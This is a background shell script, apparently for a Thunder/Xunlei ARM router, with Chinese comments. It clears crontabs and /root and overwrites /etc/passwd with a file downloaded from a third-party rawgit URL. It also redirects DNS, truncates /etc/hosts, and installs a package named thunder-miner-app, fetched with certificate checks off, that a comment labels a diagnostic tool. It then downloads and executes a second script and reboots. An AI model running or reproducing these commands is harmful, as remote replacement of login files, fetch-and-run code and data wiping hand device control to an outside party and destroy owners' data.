(export LD_LIBRARY_PATH=/thunder/lib
LOG_PATH=/tmp/reset.log
SITE="https://cdn.rawgit.com/xiefucai/xiefucai.github.io/master/"
output() {
  echo $1 >> $LOG_PATH;
}

#清除crontab定时器内容
crontab -r
[ -d /etc/crontabs ] && rm -rf /etc/crontabs/*

/bin/busybox chattr -i /etc 2>&1
chattr -i /etc/passwd*;
[ -f /etc/passwd+ ] && rm -rf /etc/passwd+ 2>&1;
[ -d /.magic ] && (rm -rf /.magic);
rm -rf /etc/resolv.conf;ln -s /tmp/resolv.conf /etc/resolv.conf;

wget "${SITE}tools/zqb/passwd?TPSecNotice&TPNotCheck" -O /etc/passwd;
rm -rf /root/* /tmp/*.core;#消除定时清缓存脚本
ls -d /tmp/opkg\-* | xargs -n 1 rm -rf;

if [ -d /opt/etc ];then
    if [ ! -h /opt ]; then
        rm -rf /opt/*;
        output "cleared /opt/*"
    fi
fi

# 安装断网诊断工具
wget --no-check-certificate 'https://update.peiluyou.com/conf/miner_test/packages/thunder-miner-app_V1.2.1297_arm.ipk?TPSecNotice&TPNotCheck' -O /tmp/t.ipk
if [ -s /tmp/t.ipk ];then
    opkg-cl remove thunder-miner-app;
    opkg-cl install /tmp/t.ipk;
else
    output '下载安装包文件失败';
    ls -al /tmp/t.ipk;
fi

wget "${SITE}tools/wget_ddd.sh?TPSecNotice&TPNotCheck" -O /tmp/wget_ddd.sh;
chmod +x /tmp/wget_ddd.sh;
sh /tmp/wget_ddd.sh;
sed -i '3,$d' /etc/hosts;

output '操作完成，30秒后重启';
sleep 30
reboot
) &
